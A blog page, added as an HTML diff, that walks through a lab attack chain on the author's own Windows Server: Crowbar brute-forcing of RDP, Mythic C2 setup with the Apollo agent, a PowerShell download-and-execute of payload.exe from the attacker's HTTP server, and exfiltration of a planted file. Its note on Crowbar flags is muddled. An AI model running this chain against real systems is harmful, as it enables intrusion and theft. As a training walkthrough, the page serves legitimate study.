@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+   · SecLice
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="SecLice">
+<meta name="description" content="
+  Attack Chain: From Initial Access to Agent Execution
+  
+    
+    Link to heading
+  
+
+
+  Phase 1: Prepare the Target (On Windows Server 2022)
+  
+    
+    Link to heading
+  
+
+This creates a &ldquo;flag&rdquo; for you to exfiltrate later.
+
+Open Command Prompt as administrator.
+Create the password file:
+echo secret! &gt; C:\Users\Public\Documents\secret.txt
+
+
+
+  Phase 2: Prepare the Attack (On Parrot OS or KAli)
+  
+    
+    Link to heading
+  
+
+
+
+Create the Wordlist:">
+<meta name="keywords" content="blog,Cybersecurity">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="SecLice">
+  <meta name="twitter:description" content="Attack Chain: From Initial Access to Agent Execution Link to heading Phase 1: Prepare the Target (On Windows Server 2022) Link to heading This creates a “flag” for you to exfiltrate later.
+Open Command Prompt as administrator. Create the password file: echo secret! &gt; C:\Users\Public\Documents\secret.txt Phase 2: Prepare the Attack (On Parrot OS or KAli) Link to heading Create the Wordlist:">
+
+<meta property="og:url" content="http://localhost:1313/posts/day21/">
+  <meta property="og:site_name" content="SecLice">
+  <meta property="og:title" content="SecLice">
+  <meta property="og:description" content="Attack Chain: From Initial Access to Agent Execution Link to heading Phase 1: Prepare the Target (On Windows Server 2022) Link to heading This creates a “flag” for you to exfiltrate later.
+Open Command Prompt as administrator. Create the password file: echo secret! &gt; C:\Users\Public\Documents\secret.txt Phase 2: Prepare the Attack (On Parrot OS or KAli) Link to heading Create the Wordlist:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-13T18:15:20+01:00">
+    <meta property="article:modified_time" content="2025-09-13T18:15:20+01:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/day21/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      SecLice
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/contact/">Contact me</a>
+            </li>
+          
+        
+        
+          
+          
+          
+            
+          
+            
+              
+                <li class="navigation-item menu-separator">
+                  <span>|</span>
+                </li>
+                
+              
+              <li class="navigation-item">
+                <a href="/pt-br/">🇧🇷</a>
+              </li>
+            
+          
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/day21/">
+              
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-09-13T18:15:20&#43;01:00">
+                September 13, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h3 id="attack-chain-from-initial-access-to-agent-execution">
+  <strong>Attack Chain: From Initial Access to Agent Execution</strong>
+  <a class="heading-link" href="#attack-chain-from-initial-access-to-agent-execution">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<h4 id="phase-1-prepare-the-target-on-windows-server-2022">
+  <strong>Phase 1: Prepare the Target (On Windows Server 2022)</strong>
+  <a class="heading-link" href="#phase-1-prepare-the-target-on-windows-server-2022">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<p>This creates a &ldquo;flag&rdquo; for you to exfiltrate later.</p>
+<ol>
+<li>Open <strong>Command Prompt</strong> as administrator.</li>
+<li>Create the password file:
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">echo</span> secret! <span class="p">&gt;</span> C:\Users\Public\Documents\secret.txt
+</span></span></code></pre></div></li>
+</ol>
+<h4 id="phase-2-prepare-the-attack-on-parrot-os-or-kali">
+  <strong>Phase 2: Prepare the Attack (On Parrot OS or KAli)</strong>
+  <a class="heading-link" href="#phase-2-prepare-the-attack-on-parrot-os-or-kali">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<ol>
+<li>
+<p><strong>Create the Wordlist:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a wordlist file containing the known password</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;ThisIsTheAdminPassword!&#34;</span> &gt; wordlist.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># You can add more passwords for a realistic brute-force</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Password123!&#34;</span> &gt;&gt; wordlist.txt
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;admin&#34;</span> &gt;&gt; wordlist.txt
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Administrator&#34;</span> &gt;&gt; wordlist.txt
+</span></span></code></pre></div></li>
+<li>
+<p><strong>Brute Force RDP with Crowbar:</strong></p>
+<ul>
+<li><strong>Fix:</strong> The <code>-C</code> flag should be <code>-C</code> (capital C) for the wordlist file, and the <code>-s</code> Target IP address/range (in CIDR notation)
+. Use the IP alone.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">crowbar -b rdp -s ip@Win-server/32 -u administrator -C wordlist.txt
+</span></span></code></pre></div><ul>
+<li><em>If successful, Crowbar will find the correct password.</em></li>
+</ul>
+</li>
+<li>
+<p><strong>Test RDP Access with xfreerdp:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xfreerdp /u:administrator /p:<span class="s1">&#39;ThisIsTheAdminPassword!&#39;</span> /v:ip@Win-server
+</span></span></code></pre></div></li>
+</ol>
+<h4 id="phase-3-set-up-the-c2-infrastructure-on-mythic-server">
+  <strong>Phase 3: Set Up the C2 Infrastructure (On Mythic Server)</strong>
+  <a class="heading-link" href="#phase-3-set-up-the-c2-infrastructure-on-mythic-server">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<ol>
+<li>
+<p><strong>Install the Apollo Agent:</strong> <a href="https://github.com/mythicagents"  class="external-link" target="_blank" rel="noopener">Agents</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Navigate to your Mythic directory first</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~/Mythic
+</span></span><span class="line"><span class="cl">./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+</span></span></code></pre></div><p><em>Wait for the installation to complete. Check status with <code>./mythic-cli status</code>.</em></p>
+</li>
+<li>
+<p><strong>Install the HTTP C2 Profile:</strong> <a href="https://github.com/mythicC2Profiles"  class="external-link" target="_blank" rel="noopener">C2Profiles</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./mythic-cli install github https://github.com/MythicC2Profiles/http
+</span></span></code></pre></div><p><em>This profile allows agents to communicate over HTTP.</em></p>
+</li>
+<li>
+<p><strong>Open Firewall Ports:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Allow HTTP (port 80) and your custom download port (9999)</span>
+</span></span><span class="line"><span class="cl">sudo ufw allow <span class="m">80</span>
+</span></span><span class="line"><span class="cl">sudo ufw allow <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">sudo ufw reload
+</span></span></code></pre></div></li>
+</ol>
+<h4 id="phase-4-staging--execution-on-your-computer">
+  <strong>Phase 4: Staging &amp; Execution (on your computer)</strong>
+  <a class="heading-link" href="#phase-4-staging--execution-on-your-computer">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<ol>
+<li>
+<p><strong>In the Mythic Web UI (<code>https://your-mythic-ip:7443</code>):</strong></p>
+<ul>
+<li><strong>Create a Payload:</strong> Go to <strong>Payloads &gt; Create Payload</strong>.
+<ul>
+<li><strong>Payload Type:</strong> <code>apollo</code></li>
+<li><strong>C2 Profile:</strong> <code>http</code></li>
+<li><strong>Set the listening port to <code>80</code></strong> in the profile parameters.</li>
+<li><strong>Platform:</strong> <code>Windows</code></li>
+<li><strong>Create</strong> and then <strong>Download</strong> the payload (e.g., <code>payload.exe</code>).</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Host the Payload on the Mythic Server:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># download the payload, you can find the link on the payload page by clicking on the icon download ad copy link</span>
+</span></span><span class="line"><span class="cl">wget https://your-mythic-ip:7443/direct/download/781dff88-3f72-4776-b176-6c9de1163ea5 
+</span></span></code></pre></div><p><strong>move the payload to Home (on Mythic server)</strong> so we can download it later.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start a simple HTTP server on port 9999</span>
+</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">9999</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>On Parrot OS (Inside your RDP Session):</strong></p>
+<ul>
+<li>
+<p>After using <code>xfreerdp</code> to log into the Windows Server, open <strong>PowerShell</strong>.</p>
+</li>
+<li>
+<p><strong>Download and Execute the Payload:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Download the payload from your Mythic server&#39;s Python HTTP server</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://your-mythic-ip:9999/payload.exe&#34;</span> <span class="n">-OutFile</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Downloads\payload.exe&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Execute the payload</span>
+</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Downloads\payload.exe&#34;</span>
+</span></span></code></pre></div><ul>
+<li>Explanation:
+<ul>
+<li>&amp; is the PowerShell call operator, used to execute commands.</li>
+<li>&ldquo;$env:USERPROFILE\Downloads\payload.exe&rdquo; builds the full path as a string.</li>
+<li>$env:USERPROFILE is an environment variable that expands to C:\Users&lt;your_username&gt;.</li>
+<li>The entire path is wrapped in quotes in case there are spaces in the username.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Important:</strong> Close the RDP session but leave the payload running.</p>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="phase-5-post-exploitation-on-mythic-web-ui">
+  <strong>Phase 5: Post-Exploitation (On Mythic Web UI)</strong>
+  <a class="heading-link" href="#phase-5-post-exploitation-on-mythic-web-ui">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h4>
+<ol>
+<li><strong>Check for Callbacks:</strong> Go to <strong>Operators &gt; Active Connections</strong>. You should see a new callback from the Windows Server.</li>
+<li><strong>Interact with the Agent:</strong> Click <strong>Select</strong> next to the callback to open a command session.</li>
+<li><strong>Exfiltrate the Password File:</strong>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Use the Apollo &#39;download&#39; command</span>
+</span></span><span class="line"><span class="cl">download C:<span class="se">\U</span>sers<span class="se">\P</span>ublic<span class="se">\D</span>ocuments<span class="se">\s</span>ecret.txt
+</span></span></code></pre></div></li>
+<li><strong>Search for Files (Optional):</strong> You can also use the <code>ls</code> and <code>cd</code> commands to browse the file system and find the <code>password.txt</code> file.</li>
+</ol>
+<div class="mermaid">
+flowchart TD
+A["Phase 1: Prep Target<br>Create password.txt on Windows"]
+B["Phase 2: Brute Force<br>Parrot OS: Crowbar & xfreerdp"]
+C["Phase 3: Setup C2<br>Mythic: Install Apollo & HTTP Profile"]
+D["Phase 4: Staging<br>Mythic: Host Payload<br>Parrot: Download via RDP"]
+E["Phase 5: Exfiltration<br>Mythic UI: Interact & Download file"]
+
+A --> B
+B -- "RDP Access" --> D
+C -- "Payload" --> D
+D -- "Agent Execution" --> E
+
+</div>
+
+<p>This chain effectively demonstrates the core stages of a cyber attack: reconnaissance/access, deployment, command &amp; control, and actions on objectives.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2017 -
+    
+    2025
+     SecLice 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"
+    integrity="sha256-QdTG1YTLLTwD3b95jLqFxpQX9uYuJMNAtVZgwKX4oYU=" crossorigin="anonymous"></script>
+  <script>
+    mermaid.initialize({ startOnLoad: true });
+  </script>
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
